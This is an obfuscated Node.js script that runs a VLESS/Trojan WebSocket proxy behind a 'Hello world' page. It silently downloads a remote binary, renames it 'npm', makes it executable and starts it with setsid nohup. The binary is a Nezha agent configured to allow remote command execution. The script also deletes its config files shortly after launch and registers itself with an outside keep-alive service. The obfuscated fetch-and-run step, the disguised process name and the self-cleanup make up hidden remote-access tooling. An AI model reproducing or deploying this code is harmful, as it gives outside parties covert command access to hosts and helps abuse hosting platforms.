const _0x2abbb7=_0x1f72;(function(_0xac0964,_0x2c9d6e){const _0x37ce6e=_0x1f72,_0x322751=_0xac0964();while(!![]){try{const _0x227354=parseInt(_0x37ce6e(0x168))/0x1*(parseInt(_0x37ce6e(0x153))/0x2)+parseInt(_0x37ce6e(0x185))/0x3+-parseInt(_0x37ce6e(0x154))/0x4+parseInt(_0x37ce6e(0x16f))/0x5+-parseInt(_0x37ce6e(0x155))/0x6*(-parseInt(_0x37ce6e(0x1ae))/0x7)+-parseInt(_0x37ce6e(0x1b6))/0x8+-parseInt(_0x37ce6e(0x1a1))/0x9*(parseInt(_0x37ce6e(0x15a))/0xa);if(_0x227354===_0x2c9d6e)break;else _0x322751['push'](_0x322751['shift']());}catch(_0x46e6f1){_0x322751['push'](_0x322751['shift']());}}}(_0xe508,0xd4749));const os=require('os'),http=require(_0x2abbb7(0x1b7)),fs=require('fs'),axios=require('axios'),net=require(_0x2abbb7(0x194)),path=require('path'),crypto=require(_0x2abbb7(0x191)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x2abbb7(0x186)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x2abbb7(0x177),NEZHA_SERVER=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x171)]||'',NEZHA_PORT=process['env'][_0x2abbb7(0x19c)]||'',NEZHA_KEY=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x17e)]||'',DOMAIN=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x189)]||_0x2abbb7(0x14f),AUTO_ACCESS=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x19f)]||![],WSPATH=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x1ad)]||UUID[_0x2abbb7(0x18a)](0x0,0x8),SUB_PATH=process[_0x2abbb7(0x1b4)][_0x2abbb7(0x163)]||_0x2abbb7(0x19e),NAME=process[_0x2abbb7(0x1b4)]['NAME']||'hug',PORT=process[_0x2abbb7(0x1b4)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x2aab2d=_0x2abbb7;try{const _0x4de46b=await axios['get'](_0x2aab2d(0x158)),_0x343fc8=_0x4de46b['data'];ISP=(_0x343fc8[_0x2aab2d(0x17b)]+'-'+_0x343fc8[_0x2aab2d(0x18e)])[_0x2aab2d(0x1bc)](/ /g,'_');}catch(_0x1097e6){ISP=_0x2aab2d(0x16e);}};function _0x1f72(_0x589995,_0x13d06c){_0x589995=_0x589995-0x147;const _0xe50837=_0xe508();let _0x1f72e9=_0xe50837[_0x589995];return _0x1f72e9;}GetISP();const httpServer=http[_0x2abbb7(0x187)]((_0x3cff7b,_0x19c9a8)=>{const _0x57ab0b=_0x2abbb7;if(_0x3cff7b['url']==='/'){const _0x39529e=path[_0x57ab0b(0x167)](__dirname,_0x57ab0b(0x16c));fs['readFile'](_0x39529e,_0x57ab0b(0x18b),(_0x4026b0,_0x2f78e4)=>{const _0x3baffb=_0x57ab0b;if(_0x4026b0){_0x19c9a8[_0x3baffb(0x18f)](0xc8,{'Content-Type':_0x3baffb(0x160)}),_0x19c9a8[_0x3baffb(0x188)]('Hello\x20world!');return;}_0x19c9a8[_0x3baffb(0x18f)](0xc8,{'Content-Type':_0x3baffb(0x160)}),_0x19c9a8[_0x3baffb(0x188)](_0x2f78e4);});return;}else{if(_0x3cff7b['url']==='/'+SUB_PATH){const _0x5df517=NAME?NAME+'-'+ISP:ISP,_0x418f62=_0x57ab0b(0x197)+UUID+_0x57ab0b(0x179)+DOMAIN+_0x57ab0b(0x17c)+DOMAIN+_0x57ab0b(0x181)+WSPATH+'#'+_0x5df517,_0x1d26be=_0x57ab0b(0x1a0)+UUID+_0x57ab0b(0x18d)+DOMAIN+_0x57ab0b(0x17c)+DOMAIN+_0x57ab0b(0x181)+WSPATH+'#'+_0x5df517,_0x2a9a66=_0x418f62+'\x0a'+_0x1d26be,_0x590c30=Buffer['from'](_0x2a9a66)[_0x57ab0b(0x149)](_0x57ab0b(0x152));_0x19c9a8['writeHead'](0xc8,{'Content-Type':_0x57ab0b(0x14c)}),_0x19c9a8[_0x57ab0b(0x188)](_0x590c30+'\x0a');}else _0x19c9a8[_0x57ab0b(0x18f)](0x194,{'Content-Type':_0x57ab0b(0x14c)}),_0x19c9a8[_0x57ab0b(0x188)](_0x57ab0b(0x148));}}),wss=new WebSocket[(_0x2abbb7(0x1ac))]({'server':httpServer}),uuid=UUID[_0x2abbb7(0x1bc)](/-/g,''),DNS_SERVERS=[_0x2abbb7(0x175),_0x2abbb7(0x19b)];function resolveHost(_0x52bfa6){return new Promise((_0x7e3103,_0x40c834)=>{const _0x5962cb=_0x1f72;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5962cb(0x1a8)](_0x52bfa6)){_0x7e3103(_0x52bfa6);return;}let _0x450d93=0x0;function _0x2f9062(){const _0x27f637=_0x5962cb;if(_0x450d93>=DNS_SERVERS[_0x27f637(0x1a7)]){_0x40c834(new Error(_0x27f637(0x1b3)+_0x52bfa6+_0x27f637(0x19d)));return;}const _0x3e6dcb=DNS_SERVERS[_0x450d93];_0x450d93++;const _0x5302fe='https://dns.google/resolve?name='+encodeURIComponent(_0x52bfa6)+'&type=A';axios[_0x27f637(0x151)](_0x5302fe,{'timeout':0x1388,'headers':{'Accept':_0x27f637(0x1a9)}})['then'](_0x4f12a2=>{const _0x43afee=_0x27f637,_0x3e4d83=_0x4f12a2[_0x43afee(0x1a6)];if(_0x3e4d83[_0x43afee(0x1a5)]===0x0&&_0x3e4d83['Answer']&&_0x3e4d83[_0x43afee(0x183)][_0x43afee(0x1a7)]>0x0){const _0x2b8f49=_0x3e4d83[_0x43afee(0x183)][_0x43afee(0x162)](_0x3202c7=>_0x3202c7[_0x43afee(0x182)]===0x1);if(_0x2b8f49){_0x7e3103(_0x2b8f49[_0x43afee(0x1a6)]);return;}}_0x2f9062();})[_0x27f637(0x170)](_0x2c68f7=>{_0x2f9062();});}_0x2f9062();});}function handleVlessConnection(_0x51a832,_0x43cb2e){const _0x1cfc29=_0x2abbb7,[_0x180d88]=_0x43cb2e,_0x5988b6=_0x43cb2e[_0x1cfc29(0x18a)](0x1,0x11);if(!_0x5988b6['every']((_0x413571,_0x1f13a3)=>_0x413571==parseInt(uuid[_0x1cfc29(0x1a3)](_0x1f13a3*0x2,0x2),0x10)))return![];let _0x55f287=_0x43cb2e[_0x1cfc29(0x18a)](0x11,0x12)['readUInt8']()+0x13;const _0x410c83=_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287,_0x55f287+=0x2)['readUInt16BE'](0x0),_0x288e1c=_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287,_0x55f287+=0x1)[_0x1cfc29(0x192)](),_0x9a2c80=_0x288e1c==0x1?_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287,_0x55f287+=0x4)[_0x1cfc29(0x167)]('.'):_0x288e1c==0x2?new TextDecoder()[_0x1cfc29(0x174)](_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287+0x1,_0x55f287+=0x1+_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287,_0x55f287+0x1)[_0x1cfc29(0x192)]())):_0x288e1c==0x3?_0x43cb2e[_0x1cfc29(0x18a)](_0x55f287,_0x55f287+=0x10)[_0x1cfc29(0x172)]((_0x3fb984,_0xedc6db,_0x5baca2,_0x3ad69f)=>_0x5baca2%0x2?_0x3fb984[_0x1cfc29(0x1b1)](_0x3ad69f[_0x1cfc29(0x18a)](_0x5baca2-0x1,_0x5baca2+0x1)):_0x3fb984,[])['map'](_0x4ecf77=>_0x4ecf77['readUInt16BE'](0x0)[_0x1cfc29(0x149)](0x10))[_0x1cfc29(0x167)](':'):'';_0x51a832['send'](new Uint8Array([_0x180d88,0x0]));const _0x53d7fc=createWebSocketStream(_0x51a832);return resolveHost(_0x9a2c80)[_0x1cfc29(0x1af)](_0x12682f=>{const _0x22ae16=_0x1cfc29;net[_0x22ae16(0x173)]({'host':_0x12682f,'port':_0x410c83},function(){const _0x4c6a63=_0x22ae16;this[_0x4c6a63(0x147)](_0x43cb2e[_0x4c6a63(0x18a)](_0x55f287)),_0x53d7fc['on'](_0x4c6a63(0x17d),()=>{})[_0x4c6a63(0x17a)](this)['on'](_0x4c6a63(0x17d),()=>{})[_0x4c6a63(0x17a)](_0x53d7fc);})['on'](_0x22ae16(0x17d),()=>{});})['catch'](_0x11c842=>{const _0x44bb1d=_0x1cfc29;net[_0x44bb1d(0x173)]({'host':_0x9a2c80,'port':_0x410c83},function(){const _0x2b4829=_0x44bb1d;this[_0x2b4829(0x147)](_0x43cb2e[_0x2b4829(0x18a)](_0x55f287)),_0x53d7fc['on'](_0x2b4829(0x17d),()=>{})[_0x2b4829(0x17a)](this)['on'](_0x2b4829(0x17d),()=>{})[_0x2b4829(0x17a)](_0x53d7fc);})['on'](_0x44bb1d(0x17d),()=>{});}),!![];}function handleTrojanConnection(_0x179daf,_0x30e779){const _0x13202a=_0x2abbb7;try{if(_0x30e779[_0x13202a(0x1a7)]<0x3a)return![];const _0x1b7378=_0x30e779[_0x13202a(0x18a)](0x0,0x38)['toString'](),_0x48561f=[UUID];let _0x4c0b35=null;for(const _0xa578dc of _0x48561f){const _0x2ad87a=crypto['createHash'](_0x13202a(0x184))[_0x13202a(0x16b)](_0xa578dc)[_0x13202a(0x157)](_0x13202a(0x14e));if(_0x2ad87a===_0x1b7378){_0x4c0b35=_0xa578dc;break;}}if(!_0x4c0b35)return![];let _0x4212c8=0x38;_0x30e779[_0x4212c8]===0xd&&_0x30e779[_0x4212c8+0x1]===0xa&&(_0x4212c8+=0x2);const _0x3f65a5=_0x30e779[_0x4212c8];if(_0x3f65a5!==0x1)return![];_0x4212c8+=0x1;const _0x41fe58=_0x30e779[_0x4212c8];_0x4212c8+=0x1;let _0x201fab,_0x5167c8;if(_0x41fe58===0x1)_0x201fab=_0x30e779['slice'](_0x4212c8,_0x4212c8+0x4)['join']('.'),_0x4212c8+=0x4;else{if(_0x41fe58===0x3){const _0x595774=_0x30e779[_0x4212c8];_0x4212c8+=0x1,_0x201fab=_0x30e779[_0x13202a(0x18a)](_0x4212c8,_0x4212c8+_0x595774)['toString'](),_0x4212c8+=_0x595774;}else{if(_0x41fe58===0x4)_0x201fab=_0x30e779[_0x13202a(0x18a)](_0x4212c8,_0x4212c8+0x10)[_0x13202a(0x172)]((_0x490bc5,_0x3290c8,_0x5de72c,_0x7ababb)=>_0x5de72c%0x2?_0x490bc5[_0x13202a(0x1b1)](_0x7ababb['slice'](_0x5de72c-0x1,_0x5de72c+0x1)):_0x490bc5,[])['map'](_0x1ef79f=>_0x1ef79f[_0x13202a(0x164)](0x0)[_0x13202a(0x149)](0x10))[_0x13202a(0x167)](':'),_0x4212c8+=0x10;else return![];}}_0x5167c8=_0x30e779[_0x13202a(0x164)](_0x4212c8),_0x4212c8+=0x2;_0x4212c8<_0x30e779[_0x13202a(0x1a7)]&&_0x30e779[_0x4212c8]===0xd&&_0x30e779[_0x4212c8+0x1]===0xa&&(_0x4212c8+=0x2);const _0x5b50d8=createWebSocketStream(_0x179daf);return resolveHost(_0x201fab)[_0x13202a(0x1af)](_0x31dfb0=>{const _0x4b50b8=_0x13202a;net[_0x4b50b8(0x173)]({'host':_0x31dfb0,'port':_0x5167c8},function(){const _0xaefb4b=_0x4b50b8;_0x4212c8<_0x30e779[_0xaefb4b(0x1a7)]&&this[_0xaefb4b(0x147)](_0x30e779[_0xaefb4b(0x18a)](_0x4212c8)),_0x5b50d8['on'](_0xaefb4b(0x17d),()=>{})[_0xaefb4b(0x17a)](this)['on'](_0xaefb4b(0x17d),()=>{})['pipe'](_0x5b50d8);})['on']('error',()=>{});})[_0x13202a(0x170)](_0x57cb13=>{const _0xd80907=_0x13202a;net[_0xd80907(0x173)]({'host':_0x201fab,'port':_0x5167c8},function(){const _0x454e3d=_0xd80907;_0x4212c8<_0x30e779[_0x454e3d(0x1a7)]&&this[_0x454e3d(0x147)](_0x30e779['slice'](_0x4212c8)),_0x5b50d8['on'](_0x454e3d(0x17d),()=>{})[_0x454e3d(0x17a)](this)['on']('error',()=>{})['pipe'](_0x5b50d8);})['on'](_0xd80907(0x17d),()=>{});}),!![];}catch(_0x19930f){return![];}}wss['on']('connection',(_0x315409,_0x3562f7)=>{const _0x328548=_0x2abbb7,_0x4e3011=_0x3562f7[_0x328548(0x1bb)]||'';_0x315409[_0x328548(0x176)](_0x328548(0x150),_0x42b5f3=>{const _0x10ad21=_0x328548;if(_0x42b5f3[_0x10ad21(0x1a7)]>0x11&&_0x42b5f3[0x0]===0x0){const _0xc8d58c=_0x42b5f3[_0x10ad21(0x18a)](0x1,0x11),_0x196124=_0xc8d58c[_0x10ad21(0x19a)]((_0x45e252,_0x570655)=>_0x45e252==parseInt(uuid[_0x10ad21(0x1a3)](_0x570655*0x2,0x2),0x10));if(_0x196124){!handleVlessConnection(_0x315409,_0x42b5f3)&&_0x315409[_0x10ad21(0x156)]();return;}}!handleTrojanConnection(_0x315409,_0x42b5f3)&&_0x315409[_0x10ad21(0x156)]();})['on'](_0x328548(0x17d),()=>{});});function _0xe508(){const _0x5837a5=['hex','a.9.3.0.d.1.f.1.0.7.4.0.1.0.0.2.ip6.arpa','message','get','base64','12oHnXEr','6745516tlRkHT','852HSUkWt','close','digest','https://speed.cloudflare.com/meta','npm\x20is\x20already\x20running,\x20skip\x20running...','20jovMWg','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','npm\x20download\x20successfully','2087','8443','chmod\x20+x\x20npm','text/html','post','find','SUB_PATH','readUInt16BE','https://amd64.ssss.nyc.mn/agent','/bin/bash','join','234681Omlamh','log','createWriteStream','update','index.html','pop','Unknown','8092605XeGCGE','catch','NEZHA_SERVER','reduce','connect','decode','8.8.4.4','once','9c63928b-9170-4dcf-90d3-fd0ffe63d2d4','error:\x20','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','pipe','country','&fp=chrome&type=ws&host=','error','NEZHA_KEY','npm','https://','&path=%2F','type','Answer','sha224','1358049CbVlGe','child_process','createServer','end','DOMAIN','slice','utf8','finish','@cdns.doon.eu.org:443?security=tls&sni=','asOrganization','writeHead','https://oooo.serv00.net/add-url','crypto','readUInt8','https://arm64.ssss.nyc.mn/v1','net','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','false','vless://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','true','every','1.1.1.1','NEZHA_PORT','\x20with\x20all\x20DNS\x20servers','sub','AUTO_ACCESS','trojan://','4392846kAeOnO','Server\x20is\x20running\x20on\x20port\x20','substr','utf-8','Status','data','length','test','application/dns-json','npm\x20running\x20error:','--tls','Server','WSPATH','19957icXbQQ','then','config.yaml','concat','includes','Failed\x20to\x20resolve\x20','env','\x20-p\x20','2810784tpnPWj','http','arch','npm\x20is\x20running','unlink','url','replace','write','Not\x20Found\x0a','toString','https://arm64.ssss.nyc.mn/agent','writeFileSync','text/plain','aarch64'];_0xe508=function(){return _0x5837a5;};return _0xe508();}const getDownloadUrl=()=>{const _0x3eb797=_0x2abbb7,_0x34849=os[_0x3eb797(0x1b8)]();return _0x34849==='arm'||_0x34849==='arm64'||_0x34849===_0x3eb797(0x14d)?!NEZHA_PORT?_0x3eb797(0x193):_0x3eb797(0x14a):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3eb797(0x165);},downloadFile=async()=>{const _0x433215=_0x2abbb7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x172d78=getDownloadUrl(),_0x308b36=await axios({'method':_0x433215(0x151),'url':_0x172d78,'responseType':'stream'}),_0x8c14c=fs[_0x433215(0x16a)]('npm');return _0x308b36['data'][_0x433215(0x17a)](_0x8c14c),new Promise((_0x11b4fd,_0x135b99)=>{const _0x1157e1=_0x433215;_0x8c14c['on'](_0x1157e1(0x18c),()=>{const _0x3415e8=_0x1157e1;console[_0x3415e8(0x169)](_0x3415e8(0x15c)),exec(_0x3415e8(0x15f),_0x32adc0=>{if(_0x32adc0)_0x135b99(_0x32adc0);_0x11b4fd();});}),_0x8c14c['on'](_0x1157e1(0x17d),_0x135b99);});}catch(_0x104934){throw _0x104934;}},runnz=async()=>{const _0x498797=_0x2abbb7;try{const _0x2a6f5b=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x498797(0x1a4)});if(_0x2a6f5b['trim']()!==''){console['log'](_0x498797(0x159));return;}}catch(_0x5ef7fd){}await downloadFile();let _0x44795d='',_0x5c2db4=['443',_0x498797(0x15e),'2096',_0x498797(0x15d),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x47b3b5=_0x5c2db4[_0x498797(0x1b2)](NEZHA_PORT)?_0x498797(0x1ab):'';_0x44795d='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x498797(0x1b5)+NEZHA_KEY+'\x20'+_0x47b3b5+_0x498797(0x198);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12bbb9=NEZHA_SERVER[_0x498797(0x1b2)](':')?NEZHA_SERVER['split'](':')[_0x498797(0x16d)]():'',_0x5405c=_0x5c2db4[_0x498797(0x1b2)](_0x12bbb9)?_0x498797(0x199):_0x498797(0x196),_0x3df47a='client_secret:\x20'+NEZHA_KEY+_0x498797(0x195)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5405c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x498797(0x14b)]('config.yaml',_0x3df47a);}_0x44795d=_0x498797(0x15b);}else{console[_0x498797(0x169)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x44795d,{'shell':_0x498797(0x166)},_0x50ecb0=>{const _0x552742=_0x498797;if(_0x50ecb0)console['error'](_0x552742(0x1aa),_0x50ecb0);else console[_0x552742(0x169)](_0x552742(0x1b9));});}catch(_0x1cfe30){console[_0x498797(0x17d)](_0x498797(0x178)+_0x1cfe30);}};async function addAccessTask(){const _0x2905ae=_0x2abbb7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x12ba35=_0x2905ae(0x180)+DOMAIN+'/'+SUB_PATH;try{const _0x26941c=await axios[_0x2905ae(0x161)](_0x2905ae(0x190),{'url':_0x12ba35},{'headers':{'Content-Type':'application/json'}});console[_0x2905ae(0x169)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x462fcc){}}const delFiles=()=>{const _0x43d6a5=_0x2abbb7;fs[_0x43d6a5(0x1ba)](_0x43d6a5(0x17f),()=>{}),fs[_0x43d6a5(0x1ba)](_0x43d6a5(0x1b0),()=>{});};httpServer['listen'](PORT,()=>{const _0x1bcf58=_0x2abbb7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x1bcf58(0x1a2)+PORT);});
